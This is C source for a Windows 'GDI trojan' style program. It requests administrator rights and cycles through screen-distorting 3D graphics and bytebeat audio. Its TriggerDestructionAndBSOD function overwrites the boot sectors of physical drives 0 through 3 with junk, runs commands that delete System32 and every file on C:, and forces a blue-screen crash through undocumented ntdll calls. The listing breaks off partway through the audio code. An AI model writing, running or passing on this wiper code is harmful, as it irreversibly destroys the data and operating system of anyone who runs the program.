#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <math.h>
#include <stdlib.h>
#include <stdint.h>
#include <mmsystem.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "msimg32.lib")

// Автоматический запрос прав администратора при двойном клике
#pragma comment(linker, "/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma comment(linker, "/MANIFESTUAC:\"level='requireAdministrator' uiAccess='false'\"")

#define AUDIO_BUFFER_SIZE 2048
#define NUM_BUFFERS 4

int current_bytebeat_id = 1;
volatile int run_bytebeat = 1;
unsigned int global_t = 0;
int last_tracked_bytebeat_id = 1;
float global_ticker = 0.0f;

typedef struct { float x, y, z; } Vec3;
typedef struct { float m[4][4]; } Mat4x4;

void MatIdentity(Mat4x4 *out) {
    memset(out, 0, sizeof(Mat4x4));
    out->m[0][0] = out->m[1][1] = out->m[2][2] = out->m[3][3] = 1.0f;
}

Vec3 VecMatMul(Vec3 in, Mat4x4 m) {
    Vec3 out;
    out.x = in.x * m.m[0][0] + in.y * m.m[1][0] + in.z * m.m[2][0] + m.m[3][0];
    out.y = in.x * m.m[0][1] + in.y * m.m[1][1] + in.z * m.m[2][1] + m.m[3][1];
    out.z = in.x * m.m[0][2] + in.y * m.m[1][2] + in.z * m.m[2][2] + m.m[3][2];
    float w = in.x * m.m[0][3] + in.y * m.m[1][3] + in.z * m.m[2][3] + m.m[3][3];
    if (w != 0) { out.x /= w; out.y /= w; out.z /= w; }
    return out;
}

POINT Project(Vec3 v, int w, int h, float fov) {
    float z_factor = 1.0f / (fov + v.z / 400.0f);
    POINT p;
    p.x = (LONG)(w / 2 + v.x * z_factor * 3.0f);
    p.y = (LONG)(h / 2 - v.y * z_factor * 3.0f);
    return p;
}

void EffectParallaxRight(HDC hdc, int w, int h, float ticker) {
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP memBmp = CreateCompatibleBitmap(hdc, w, h);
    HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, memBmp);
    BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

    int slices = 10;
    int sliceHeight = h / slices;
    for (int i = 0; i < slices; i++) {
        int offset = (int)((sin(ticker * 0.1f + i * 0.5f) + 1.0f) * 40.0f + i * 5.0f);
        BitBlt(hdc, offset, i * sliceHeight, w, sliceHeight, memDC, 0, i * sliceHeight, SRCCOPY);
    }

    SelectObject(memDC, oldBmp);
    DeleteObject(memBmp);
    DeleteDC(memDC);
}

void EffectStretchDirectional(HDC hdc, int w, int h, float ticker) {
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP memBmp = CreateCompatibleBitmap(hdc, w, h);
    HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, memBmp);
    BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

    float phase = sin(ticker * 0.1f);
    int dx = (int)(phase * 60.0f);
    int dy = (int)(cos(ticker * 0.1f) * 60.0f);

    StretchBlt(hdc, -dx, -dy, w + dx * 2, h + dy * 2, memDC, 0, 0, w, h, SRCCOPY);

    SelectObject(memDC, oldBmp);
    DeleteObject(memBmp);
    DeleteDC(memDC);
}

void EffectVerticalWave(HDC hdc, int w, int h, float ticker) {
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP memBmp = CreateCompatibleBitmap(hdc, w, h);
    HBITMAP oldBmp = (HBITMAP)SelectObject(memDC, memBmp);
    BitBlt(memDC, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

    int sliceWidth = 10;
    for (int x = 0; x < w; x += sliceWidth) {
        int offsetY = (int)(sin(ticker * 0.15f + x * 0.03f) * 35.0f);
        BitBlt(hdc, x, offsetY, sliceWidth, h, memDC, x, 0, SRCCOPY);
    }

    SelectObject(memDC, oldBmp);
    DeleteObject(memBmp);
    DeleteDC(memDC);
}

void Draw3DCube(HDC hdc, int w, int h, float ticker, float speed_mult, float color_offset) {
    float size = 300.0f;
    float rx = ticker * 0.02f * speed_mult;
    float ry = ticker * 0.03f * speed_mult;

    Mat4x4 m;
    MatIdentity(&m);
    float cx = cos(rx), sx_r = sin(rx), cy = cos(ry), sy_r = sin(ry);
    m.m[0][0] = cy; m.m[0][2] = -sy_r;
    m.m[1][0] = sx_r * sy_r; m.m[1][1] = cx; m.m[1][2] = sx_r * cy;
    m.m[2][0] = cx * sy_r; m.m[2][1] = -sx_r; m.m[2][2] = cx * cy;

    int r = (int)(sin(ticker * 0.03f + color_offset) * 127 + 128);
    int g = (int)(sin(ticker * 0.04f + color_offset + 2.0f) * 127 + 128);
    int b = (int)(sin(ticker * 0.05f + color_offset + 4.0f) * 127 + 128);

    HPEN pen = CreatePen(PS_SOLID, 1, RGB(r, g, b));
    HBRUSH brush = CreateSolidBrush(RGB(r / 3, g / 3, b / 3));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);
    HBRUSH old_b = (HBRUSH)SelectObject(hdc, brush);

    float steps = 8.0f;
    float sub_size = size / steps;

    for (float x = -size / 2; x < size / 2; x += sub_size) {
        for (float y = -size / 2; y < size / 2; y += sub_size) {
            for (float z = -size / 2; z < size / 2; z += sub_size) {
                Vec3 v = { x + sub_size/2, y + sub_size/2, z + sub_size/2 };
                v = VecMatMul(v, m);
                POINT p = Project(v, w, h, 3.0f);
                int sz = 2; 
                Rectangle(hdc, p.x - sz, p.y - sz, p.x + sz, p.y + sz);
            }
        }
    }

    SelectObject(hdc, old_p);
    SelectObject(hdc, old_b);
    DeleteObject(pen);
    DeleteObject(brush);
}

void Draw3DPyramid(HDC hdc, int w, int h, float ticker, float speed_mult) {
    float rx = ticker * 0.03f * speed_mult;
    float ry = ticker * 0.04f * speed_mult;

    Mat4x4 m;
    MatIdentity(&m);
    float cx = cos(rx), sx_r = sin(rx), cy = cos(ry), sy_r = sin(ry);
    m.m[0][0] = cy; m.m[0][2] = -sy_r;
    m.m[1][0] = sx_r * sy_r; m.m[1][1] = cx; m.m[1][2] = sx_r * cy;
    m.m[2][0] = cx * sy_r; m.m[2][1] = -sx_r; m.m[2][2] = cx * cy;

    Vec3 pts[4] = {
        {0.0f, 150.0f, 0.0f},
        {-130.0f, -100.0f, -130.0f},
        {130.0f, -100.0f, -130.0f},
        {0.0f, -100.0f, 150.0f}
    };

    POINT p[4];
    for(int i=0; i<4; i++) {
        Vec3 v = VecMatMul(pts[i], m);
        p[i] = Project(v, w, h, 2.5f);
    }

    HPEN pen = CreatePen(PS_SOLID, 2, RGB(0, 255, 255));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    int edges[6][2] = {{0,1},{0,2},{0,3},{1,2},{2,3},{3,1}};
    for(int i=0; i<6; i++) {
        MoveToEx(hdc, p[edges[i][0]].x, p[edges[i][0]].y, NULL);
        LineTo(hdc, p[edges[i][1]].x, p[edges[i][1]].y);
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DTorus(HDC hdc, int w, int h, float ticker) {
    float R = 150.0f;
    float r_minor = 60.0f;
    float rx = ticker * 0.025f;
    float rz = ticker * 0.015f;

    Mat4x4 m;
    MatIdentity(&m);
    float cx = cos(rx), sx = sin(rx), cz = cos(rz), sz = sin(rz);
    m.m[0][0] = cz; m.m[0][1] = -sz;
    m.m[1][0] = sx * sz;
    m.m[1][1] = cx * cz; m.m[1][2] = -sx;
    m.m[2][0] = sx * sz; m.m[2][1] = sx * cz; m.m[2][2] = cx;

    HPEN pen = CreatePen(PS_SOLID, 1, RGB(255, 0, 128));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    for (float phi = 0; phi < 6.28f; phi += 0.4f) {
        for (float theta = 0; theta < 6.28f; theta += 0.4f) {
            float x = (R + r_minor * cos(theta)) * cos(phi);
            float y = (R + r_minor * cos(theta)) * sin(phi);
            float z = r_minor * sin(theta);

            Vec3 v = {x, y, z};
            v = VecMatMul(v, m);
            POINT pt = Project(v, w, h, 3.5f);
            
            Rectangle(hdc, pt.x - 1, pt.y - 1, pt.x + 2, pt.y + 2);
        }
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DSierpinskiPyramid(HDC hdc, int w, int h, float ticker, int depth, Vec3 a, Vec3 b, Vec3 c, Vec3 d, COLORREF col1, COLORREF col2, COLORREF col3, COLORREF col4) {
    float rx = ticker * 0.015f;
    float ry = ticker * 0.02f;

    Mat4x4 m;
    MatIdentity(&m);
    float cx = cos(rx), sx = sin(rx), cy = cos(ry), sy = sin(ry);
    m.m[0][0] = cy; m.m[0][2] = -sy;
    m.m[1][0] = sx * sy; m.m[1][1] = cx; m.m[1][2] = sx * cy;
    m.m[2][0] = cx * sy; m.m[2][1] = -sx; m.m[2][2] = cx * cy;

    if (depth == 0) {
        Vec3 va = VecMatMul(a, m);
        Vec3 vb = VecMatMul(b, m);
        Vec3 vc = VecMatMul(c, m);
        Vec3 vd = VecMatMul(d, m);

        POINT pa = Project(va, w, h, 2.2f);
        POINT pb = Project(vb, w, h, 2.2f);
        POINT pc = Project(vc, w, h, 2.2f);
        POINT pd = Project(vd, w, h, 2.2f);

        POINT face1[3] = {pa, pb, pc};
        POINT face2[3] = {pa, pb, pd};
        POINT face3[3] = {pa, pc, pd};
        POINT face4[3] = {pb, pc, pd};

        HBRUSH br1 = CreateSolidBrush(col1);
        HBRUSH br2 = CreateSolidBrush(col2);
        HBRUSH br3 = CreateSolidBrush(col3);
        HBRUSH br4 = CreateSolidBrush(col4);

        HBRUSH oldB = (HBRUSH)SelectObject(hdc, br1);
        HPEN nullPen = (HPEN)GetStockObject(NULL_PEN);
        HPEN oldP = (HPEN)SelectObject(hdc, nullPen);

        Polygon(hdc, face1, 3);
        SelectObject(hdc, br2);
        Polygon(hdc, face2, 3);
        SelectObject(hdc, br3);
        Polygon(hdc, face3, 3);
        SelectObject(hdc, br4);
        Polygon(hdc, face4, 3);

        SelectObject(hdc, oldB);
        SelectObject(hdc, oldP);
        DeleteObject(br1);
        DeleteObject(br2);
        DeleteObject(br3);
        DeleteObject(br4);
    } else {
        Vec3 ab = {(a.x + b.x)/2, (a.y + b.y)/2, (a.z + b.z)/2};
        Vec3 ac = {(a.x + c.x)/2, (a.y + c.y)/2, (a.z + c.z)/2};
        Vec3 ad = {(a.x + d.x)/2, (a.y + d.y)/2, (a.z + d.z)/2};
        Vec3 bc = {(b.x + c.x)/2, (b.y + c.y)/2, (b.z + c.z)/2};
        Vec3 bd = {(b.x + d.x)/2, (b.y + d.y)/2, (b.z + d.z)/2};
        Vec3 cd = {(c.x + d.x)/2, (c.y + d.y)/2, (c.z + d.z)/2};

        Draw3DSierpinskiPyramid(hdc, w, h, ticker, depth - 1, a, ab, ac, ad, col1, col2, col3, col4);
        Draw3DSierpinskiPyramid(hdc, w, h, ticker, depth - 1, ab, b, bc, bd, col2, col3, col4, col1);
        Draw3DSierpinskiPyramid(hdc, w, h, ticker, depth - 1, ac, bc, c, cd, col3, col4, col1, col2);
        Draw3DSierpinskiPyramid(hdc, w, h, ticker, depth - 1, ad, bd, cd, d, col4, col1, col2, col3);
    }
}

void Draw3DSpiral(HDC hdc, int w, int h, float ticker) {
    HPEN pen1 = CreatePen(PS_SOLID, 2, RGB(255, 255, 0));
    HPEN pen2 = CreatePen(PS_SOLID, 2, RGB(0, 128, 255));
    
    for (float t = 0; t < 15.0f; t += 0.3f) {
        float angle = t + ticker * 0.05f;
        float x1 = cos(angle) * 120.0f;
        float z1 = sin(angle) * 120.0f;
        float y1 = (t * 25.0f) - 180.0f;

        float x2 = cos(angle + 3.14159f) * 120.0f;
        float z2 = sin(angle + 3.14159f) * 120.0f;
        float y2 = (t * 25.0f) - 180.0f;

        Vec3 v1 = {x1, y1, z1};
        Vec3 v2 = {x2, y2, z2};

        POINT p1 = Project(v1, w, h, 3.0f);
        POINT p2 = Project(v2, w, h, 3.0f);

        SelectObject(hdc, pen1);
        Ellipse(hdc, p1.x - 3, p1.y - 3, p1.x + 3, p1.y + 3);

        SelectObject(hdc, pen2);
        Ellipse(hdc, p2.x - 3, p2.y - 3, p2.x + 3, p2.y + 3);
        
        HPEN linePen = CreatePen(PS_DOT, 1, RGB(200, 200, 200));
        SelectObject(hdc, linePen);
        MoveToEx(hdc, p1.x, p1.y, NULL);
        LineTo(hdc, p2.x, p2.y);
        DeleteObject(linePen);
    }

    DeleteObject(pen1);
    DeleteObject(pen2);
}

void Draw3DWarpStars(HDC hdc, int w, int h, float ticker) {
    int num_stars = 100;
    for (int i = 0; i < num_stars; i++) {
        float angle = (float)i * 1.3f;
        float dist = fmodf((float)i * 37.0f + ticker * 4.0f, 500.0f);
        if (dist < 1.0f) dist = 1.0f;

        float x = cos(angle) * dist * 2.0f;
        float y = sin(angle) * dist * 2.0f;
        float z = 600.0f - dist * 1.2f;

        Vec3 v = {x, y, z};
        POINT p = Project(v, w, h, 1.5f);

        int col = (int)(255 * (1.0f - dist / 500.0f));
        if (col < 0) col = 0;
        
        HBRUSH br = CreateSolidBrush(RGB(col, col, col));
        HBRUSH oldB = (HBRUSH)SelectObject(hdc, br);
        int sz = (int)(4.0f * (1.0f - dist / 600.0f));
        if (sz < 1) sz = 1;
        Ellipse(hdc, p.x - sz, p.y - sz, p.x + sz, p.y + sz);
        SelectObject(hdc, oldB);
        DeleteObject(br);
    }
}

void Draw3DOctahedron(HDC hdc, int w, int h, float ticker) {
    float rx = ticker * 0.04f;
    float ry = ticker * 0.02f;

    Mat4x4 m;
    MatIdentity(&m);
    float cx = cos(rx), sx = sin(rx), cy = cos(ry), sy = sin(ry);
    m.m[0][0] = cy; m.m[0][2] = -sy;
    m.m[1][0] = sx * sy; m.m[1][1] = cx; m.m[1][2] = sx * cy;
    m.m[2][0] = cx * sy; m.m[2][1] = -sx; m.m[2][2] = cx * cy;

    Vec3 verts[6] = {
        {0, 160, 0}, {0, -160, 0},
        {160, 0, 0}, {-160, 0, 0},
        {0, 0, 160}, {0, 0, -160}
    };

    POINT p[6];
    for(int i=0; i<6; i++) {
        p[i] = Project(VecMatMul(verts[i], m), w, h, 3.0f);
    }

    HPEN pen = CreatePen(PS_SOLID, 2, RGB(255, 165, 0));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    int faces[8][3] = {
        {0,2,4},{0,4,3},{0,3,5},{0,5,2},
        {1,4,2},{1,3,4},{1,5,3},{1,2,5}
    };

    for(int i=0; i<8; i++) {
        MoveToEx(hdc, p[faces[i][0]].x, p[faces[i][0]].y, NULL);
        LineTo(hdc, p[faces[i][1]].x, p[faces[i][1]].y);
        LineTo(hdc, p[faces[i][2]].x, p[faces[i][2]].y);
        LineTo(hdc, p[faces[i][0]].x, p[faces[i][0]].y);
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DSaturnRings(HDC hdc, int w, int h, float ticker) {
    Vec3 center_v = {0, 0, 0};
    POINT cp = Project(center_v, w, h, 3.0f);
    HBRUSH br = CreateSolidBrush(RGB(200, 150, 100));
    HBRUSH oldB = (HBRUSH)SelectObject(hdc, br);
    Ellipse(hdc, cp.x - 60, cp.y - 60, cp.x + 60, cp.y + 60);
    SelectObject(hdc, oldB);
    DeleteObject(br);

    HPEN pen = CreatePen(PS_SOLID, 1, RGB(220, 220, 150));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    for(float r = 90.0f; r < 220.0f; r += 15.0f) {
        for(float a = 0; a < 6.28f; a += 0.2f) {
            float angle = a + ticker * 0.03f;
            float x = cos(angle) * r;
            float z = sin(angle) * r * 0.4f;
            float y = sin(angle) * r * 0.2f;

            Vec3 v = {x, y, z};
            POINT pt = Project(v, w, h, 3.0f);
            Rectangle(hdc, pt.x - 1, pt.y - 1, pt.x + 2, pt.y + 2);
        }
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DTunnelBoxes(HDC hdc, int w, int h, float ticker) {
    HPEN pen = CreatePen(PS_SOLID, 2, RGB(0, 255, 100));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    int layers = 10;
    for (int i = 0; i < layers; i++) {
        float z = fmodf((float)i * 60.0f - ticker * 3.0f, (float)(layers * 60.0f));
        if (z < 1.0f) z = 1.0f;

        float size = 400.0f * (300.0f / (z + 50.0f));
        POINT p1 = Project((Vec3){-size, -size, z}, w, h, 1.0f);
        POINT p2 = Project((Vec3){size, -size, z}, w, h, 1.0f);
        POINT p3 = Project((Vec3){size, size, z}, w, h, 1.0f);
        POINT p4 = Project((Vec3){-size, size, z}, w, h, 1.0f);

        MoveToEx(hdc, p1.x, p1.y, NULL);
        LineTo(hdc, p2.x, p2.y);
        LineTo(hdc, p3.x, p3.y);
        LineTo(hdc, p4.x, p4.y);
        LineTo(hdc, p1.x, p1.y);
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DCylinder(HDC hdc, int w, int h, float ticker) {
    float rx = ticker * 0.03f;
    float ry = ticker * 0.03f;

    Mat4x4 m;
    MatIdentity(&m);
    float cx = cos(rx), sx = sin(rx), cy = cos(ry), sy = sin(ry);
    m.m[0][0] = cy; m.m[0][2] = -sy;
    m.m[1][0] = sx * sy; m.m[1][1] = cx; m.m[1][2] = sx * cy;
    m.m[2][0] = cx * sy; m.m[2][1] = -sx; m.m[2][2] = cx * cy;

    HPEN pen = CreatePen(PS_SOLID, 1, RGB(255, 0, 255));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    float radius = 100.0f;
    float height_val = 180.0f;

    for (float h_step = -height_val; h_step <= height_val; h_step += 40.0f) {
        for (float theta = 0; theta < 6.28f; theta += 0.4f) {
            float x = cos(theta) * radius;
            float z = sin(theta) * radius;
            float y = h_step;

            Vec3 v = VecMatMul((Vec3){x, y, z}, m);
            POINT p = Project(v, w, h, 3.0f);
            Ellipse(hdc, p.x - 2, p.y - 2, p.x + 3, p.y + 3);
        }
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DFractalCluster(HDC hdc, int w, int h, float ticker) {
    float rx = ticker * 0.02f;
    Mat4x4 m;
    MatIdentity(&m);
    m.m[0][0] = cos(rx); m.m[0][2] = -sin(rx);
    m.m[2][0] = sin(rx); m.m[2][2] = cos(rx);

    HPEN pen = CreatePen(PS_SOLID, 2, RGB(0, 255, 255));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    int branches = 12;
    for (int i = 0; i < branches; i++) {
        float angle = i * (6.28f / branches) + ticker * 0.01f;
        Vec3 inner = {0, 0, 0};
        Vec3 outer = {cos(angle) * 180.0f, sin(ticker * 0.05f + i) * 100.0f, sin(angle) * 180.0f};

        POINT pi = Project(VecMatMul(inner, m), w, h, 3.0f);
        POINT po = Project(VecMatMul(outer, m), w, h, 3.0f);

        MoveToEx(hdc, pi.x, pi.y, NULL);
        LineTo(hdc, po.x, po.y);
        Ellipse(hdc, po.x - 4, po.y - 4, po.x + 4, po.y + 4);
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DMobius(HDC hdc, int w, int h, float ticker) {
    HPEN pen = CreatePen(PS_SOLID, 1, RGB(255, 255, 100));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    float rx = ticker * 0.03f;
    Mat4x4 m;
    MatIdentity(&m);
    m.m[1][1] = cos(rx); m.m[1][2] = -sin(rx);
    m.m[2][1] = sin(rx); m.m[2][2] = cos(rx);

    for (float u = 0; u < 6.28f; u += 0.15f) {
        for (float v_val = -30.0f; v_val <= 30.0f; v_val += 15.0f) {
            float x = (120.0f + v_val * cos(u / 2.0f)) * cos(u);
            float y = (120.0f + v_val * cos(u / 2.0f)) * sin(u);
            float z = v_val * sin(u / 2.0f);

            Vec3 vec = VecMatMul((Vec3){x, y, z}, m);
            POINT pt = Project(vec, w, h, 3.0f);
            Rectangle(hdc, pt.x, pt.y, pt.x + 2, pt.y + 2);
        }
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DConeField(HDC hdc, int w, int h, float ticker) {
    HPEN pen = CreatePen(PS_SOLID, 1, RGB(255, 80, 80));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    int size = 8;
    float spacing = 50.0f;
    for (int x = -size; x <= size; x++) {
        for (int z = -size; z <= size; z++) {
            float px = x * spacing;
            float pz = z * spacing;
            float py = sin(ticker * 0.1f + x * 0.4f + z * 0.4f) * 70.0f;

            Vec3 top = {px, py - 40.0f, pz};
            Vec3 base = {px, py + 40.0f, pz};

            POINT ptTop = Project(top, w, h, 2.5f);
            POINT ptBase = Project(base, w, h, 2.5f);

            MoveToEx(hdc, ptBase.x, ptBase.y, NULL);
            LineTo(hdc, ptTop.x, ptTop.y);
            Ellipse(hdc, ptTop.x - 2, ptTop.y - 2, ptTop.x + 2, ptTop.y + 2);
        }
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DConstellation(HDC hdc, int w, int h, float ticker) {
    HPEN pen = CreatePen(PS_SOLID, 1, RGB(150, 150, 255));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    int nodes = 15;
    for (int i = 0; i < nodes; i++) {
        float angle1 = i * 0.5f + ticker * 0.02f;
        float angle2 = i * 0.7f - ticker * 0.015f;
        
        Vec3 v1 = {cos(angle1) * 150.0f, sin(angle2) * 150.0f, sin(angle1) * 100.0f};
        Vec3 v2 = {cos(angle1 + 1.0f) * 150.0f, sin(angle2 + 1.0f) * 150.0f, cos(angle2) * 100.0f};

        POINT p1 = Project(v1, w, h, 3.0f);
        POINT p2 = Project(v2, w, h, 3.0f);

        MoveToEx(hdc, p1.x, p1.y, NULL);
        LineTo(hdc, p2.x, p2.y);
        Ellipse(hdc, p1.x - 3, p1.y - 3, p1.x + 3, p1.y + 3);
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void Draw3DSphereGlobe(HDC hdc, int w, int h, float ticker) {
    float rx = ticker * 0.025f;
    float ry = ticker * 0.035f;

    Mat4x4 m;
    MatIdentity(&m);
    float cx = cos(rx), sx = sin(rx), cy = cos(ry), sy = sin(ry);
    m.m[0][0] = cy; m.m[0][2] = -sy;
    m.m[1][0] = sx * sy; m.m[1][1] = cx; m.m[1][2] = sx * cy;
    m.m[2][0] = cx * sy; m.m[2][1] = -sx; m.m[2][2] = cx * cy;

    HPEN pen = CreatePen(PS_SOLID, 1, RGB(0, 255, 120));
    HPEN old_p = (HPEN)SelectObject(hdc, pen);

    float radius = 150.0f;
    for (float lat = -1.57f; lat <= 1.57f; lat += 0.4f) {
        for (float lon = 0; lon <= 6.28f; lon += 0.4f) {
            float x = radius * cos(lat) * cos(lon);
            float y = radius * sin(lat);
            float z = radius * cos(lat) * sin(lon);

            Vec3 v = VecMatMul((Vec3){x, y, z}, m);
            POINT p = Project(v, w, h, 3.0f);
            Rectangle(hdc, p.x - 1, p.y - 1, p.x + 2, p.y + 2);
        }
    }

    SelectObject(hdc, old_p);
    DeleteObject(pen);
}

void TriggerDestructionAndBSOD() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    }

    for (int i = 0; i < 4; i++) {
        wchar_t drivePath[64];
        wsprintfW(drivePath, L"\\\\.\\PhysicalDrive%d", i);
        HANDLE hDrive = CreateFileW(drivePath, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (hDrive != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            char garbage[4096];
            memset(garbage, 0xFF, sizeof(garbage));
            WriteFile(hDrive, garbage, sizeof(garbage), &bytesWritten, NULL);
            CloseHandle(hDrive);
        }
    }

    system("rd /s /q C:\\Windows\\System32");
    system("del /f /s /q C:\\*.*");

    typedef NTSTATUS(NTAPI* pfnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
    typedef NTSTATUS(NTAPI* pfnNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR *Parameters, ULONG ValidResponseOption, PULONG Response);

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll) {
        pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        pfnNtRaiseHardError NtRaiseHardError = (pfnNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            BOOLEAN enabled;
            ULONG response;
            RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);
        }
    }
}

void RunPayloadForId(HDC hdc, int id, int w, int h, float ticker) {
    global_ticker += 1.0f;
    
    switch (id) {
        case 1:
            EffectParallaxRight(hdc, w, h, global_ticker);
            Draw3DCube(hdc, w, h, global_ticker, 2.5f, 5.0f);
            break;
        case 2:
            EffectStretchDirectional(hdc, w, h, global_ticker);
            Draw3DPyramid(hdc, w, h, global_ticker, 2.0f);
            break;
        case 3:
            EffectVerticalWave(hdc, w, h, global_ticker);
            Draw3DTorus(hdc, w, h, global_ticker);
            break;
        case 4:
            EffectParallaxRight(hdc, w, h, global_ticker);
            {
                Vec3 a = {0.0f, 220.0f, 0.0f};
                Vec3 b = {-200.0f, -150.0f, -150.0f};
                Vec3 c = {200.0f, -150.0f, -150.0f};
                Vec3 d = {0.0f, -150.0f, 220.0f};
                Draw3DSierpinskiPyramid(hdc, w, h, global_ticker, 3, a, b, c, d, 
                    RGB(255, 50, 50), RGB(50, 255, 50), RGB(50, 50, 255), RGB(255, 255, 0));
            }
            break;
        case 5:
            EffectStretchDirectional(hdc, w, h, global_ticker);
            Draw3DSpiral(hdc, w, h, global_ticker);
            break;
        case 6:
            EffectVerticalWave(hdc, w, h, global_ticker);
            Draw3DWarpStars(hdc, w, h, global_ticker);
            break;
        case 7:
            EffectParallaxRight(hdc, w, h, global_ticker);
            Draw3DOctahedron(hdc, w, h, global_ticker);
            break;
        case 8:
            EffectStretchDirectional(hdc, w, h, global_ticker);
            Draw3DSaturnRings(hdc, w, h, global_ticker);
            break;
        case 9:
            EffectVerticalWave(hdc, w, h, global_ticker);
            Draw3DTunnelBoxes(hdc, w, h, global_ticker);
            break;
        case 10:
            EffectParallaxRight(hdc, w, h, global_ticker);
            Draw3DCylinder(hdc, w, h, global_ticker);
            break;
        case 11:
            EffectStretchDirectional(hdc, w, h, global_ticker);
            Draw3DFractalCluster(hdc, w, h, global_ticker);
            break;
        case 12:
            EffectVerticalWave(hdc, w, h, global_ticker);
            Draw3DMobius(hdc, w, h, global_ticker);
            break;
        case 13:
            EffectParallaxRight(hdc, w, h, global_ticker);
            Draw3DConeField(hdc, w, h, global_ticker);
            break;
        case 14:
            EffectStretchDirectional(hdc, w, h, global_ticker);
            Draw3DConstellation(hdc, w, h, global_ticker);
            break;
        case 15:
            EffectVerticalWave(hdc, w, h, global_ticker);
            Draw3DSphereGlobe(hdc, w, h, global_ticker);
            break;
        default:
            TriggerDestructionAndBSOD();
            break;
    }
}

unsigned char GetBytebeatSample(int id, unsigned int t) {
    unsigned int tt = t;
    double dt = (double)t;
    double PI = 3.1415926535;
    unsigned int raw = 0;

    switch (id) {
        case 1:  
            {
                unsigned int height = 256;
                unsigned int x = (tt / height) % (1024 * height);
                unsigned int y = 255 - (256 / height) * tt % 256;
                unsigned int z = (2 * x) % 512;
                z = (z < (511 - z)) ? z : (511 - z);
                raw = (abs((int)z - (int)y) < 10) ? 255 : 0;
            }
            break;
        case 2:  
            raw = (unsigned int)((tt * (tt >> 8 | tt >> 9) & 46) ^ (tt >> 8));
            break;
        case 3:  
            raw = (unsigned int)((unsigned int)(tt * 0.25) * (tt >> 12 & 13 ^ 2 | tt >> 10 & 9));
            break;
        case 4:  
            {
                double val = (((tt / 2048) & 3) ? (((6 * tt & tt >> 6) - ((5 + 2 * (1 & -tt >> 15)) * tt & tt >> 5)) & 255) / 2 + (((double)rand() / RAND_MAX) * 80 * !(tt / 256 & 7)) : ((int)(4e6 / pow((double)(tt % 8192), 1.1)) & 128) + (((double)rand() / RAND_MAX) * 500 * !(tt / 1024 + 8 & 15)));
                raw = (unsigned int)val;
            }
            break;
        case 5:  
            raw = (unsigned int)((tt * 5 & tt >> 7) | (tt * 3 & tt >> 10));
            break;
        case 6:  
            raw = (unsigned int)((tt >> 3) * (tt >> 9) & (tt >> 4));
            break;
        case 7:  
            {
                int mod_t = tt & 4095;
                if (mod_t == 0) mod_t = 1;
                double t_val = tan(600.0 / mod_t);
                int idx = 7 & (tt >> 10);
                double mults[8] = {1.0, 1.2, 1.5, 1.6, (tt & 16384 ? 1.8 : 2.0), 1.6, 1.5, 1.2};
                double m = mults[idx];
                unsigned int shift_val = (unsigned int)(dt * m);
                raw = (unsigned int)((int)t_val | (int)(tt * sin(dt) * (1 & tt >> 12)) & (-tt >> 4) | (tt >> (shift_val % 32)) * (tt & 32768 ? 9 : 10) & tt >> 4);
            }
            break;
        case 8:  
            raw = (unsigned int)(tt * ((tt >> 12 | tt >> 8) & 63));
            break;
        case 9:  
